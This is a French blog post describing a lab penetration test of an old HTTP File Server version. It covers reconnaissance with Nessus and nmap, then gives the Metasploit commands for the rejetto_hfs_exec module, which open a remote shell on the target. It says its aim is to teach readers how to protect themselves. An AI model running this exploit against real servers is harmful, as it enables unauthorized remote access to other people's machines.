---
layout: post
title:  "Test d'intrusion sur un HTTP File Server"
date:   2021-11-01
last-update: 
categories: securite
tags: http pentesting hfs
image: /assets/article/pentest/hfs/hfs.PNG
description: Présentation d'un test d'intrusion sur une ancienne version de HTTP File Server afin de sensibiliser le lecteur aux différentes vulnérabilités possibles pour qu'il s'en prémunisse.
---

> Cet article présente un test d'intrusion sur une ancienne version de HTTP File Server afin de sensibiliser le lecteur aux différentes vulnérabilités possibles pour qu'il s'en prémunisse.
>
> Tous les exemples montrés sur cet article l'ont été sur des machines de laboratoires.

**HTTP File Server** abrégé HFS permet d'envoyer et de recevoir des fichiers en utilisant le protocole HTTP.
Le 31 octobre 2021, la dernière version était 2.3m.

Avec une ancienne version, la 2.3 b, il était possible d'obtenir un shell sur la machine avec metasploit.



## Reconnaissance

Lors d'une 1ère phase de reconnaissance, en lançant un scan avec Nessus, celui-ci a trouvé qu'un serveur HTTP HFS était installé à l'adresse IP <IP server> avec le port 80.

Petite remarques : cette hôte n'était pas détecté en lançant le scan nmap suivant : `sudo nmap -O <IP server>

![hfs-recon]({{site.url_complet}}/assets/article/pentest/hfs/hfs-recon.PNG)



On peut vérifier la présence du serveur en se connectant avec son navigateur. On arrive alors sur la page principale d'HFS.

On peut voir en bas que la version est 2.3. A ce stade, il n'est pas encore possible d'être sûr à 100% que cette version est vulnérable

![hfs]({{site.url_complet}}/assets/article/pentest/hfs/hfs.PNG)

## Exploit

En faisant une recherche avec google, un module metasploit efficace contre la version 2.3 b est disponible

Documentation : [www.rejetto.com/hfs/](https://www.rejetto.com/hfs/)

Il suffit alors de lancer metasploit, d'effectuer la configuration des hôtes et de lancer l'exploit

```bash
use use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP server>  #Target
set LHOST <IP localhost> #Local host ip
```

Bingo, la machine était bien vulnérable à l'exploit. On obtient par conséquent un shell sur la machine permettant de lire les fichiers s'y trouvant



![meterpreter-result]({{site.url_complet}}/assets/article/pentest/hfs/meterpreter-result.PNG)

## Source :

- Documentation metasploit : [www.rapid7.com - rejetto_hfs_exec/](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)
- Site officiel de l'éditeur : [www.rejetto.com/hfs/](https://www.rejetto.com/hfs/)
